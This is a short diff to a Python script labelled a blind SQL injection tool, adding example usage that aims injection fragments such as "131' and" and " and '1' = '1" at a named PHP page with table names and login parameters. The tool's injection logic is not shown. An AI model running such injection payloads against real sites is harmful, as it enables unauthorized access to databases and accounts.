@@ -5,6 +5,7 @@ import argparse
 
 
 parser = argparse.ArgumentParser(description= "Bliend SQLi Tool")
+parser.description = "EX:\n\tpython sqli.py -u http://nk.iqsp.com/nk/conent.php -t accounts ips -p id=kaya pw=passwd -q id -s \"131' and\" -sign Hacked -e \" and '1' = '1\" data'"
 
 req = parser.add_argument_group("필수 옵션", "반드시 작성해야하는 옵션입니다.")
 sel = parser.add_argument_group("선택옵션", "초기값이 있는 옵션들 입니다.")
@@ -62,6 +63,6 @@ else:
 
 #######################
 #EX
-#-u http://nk.iqsp.com/nk/conent.php -t accounts -q id -s "131' and" -sign Hacked -e " and '1' = '1" data
+#-u http://nk.iqsp.com/nk/conent.php -t accounts ips -p id=kaya pw=passwd -q id -s "131' and" -sign Hacked -e " and '1' = '1" data
 #######################
 
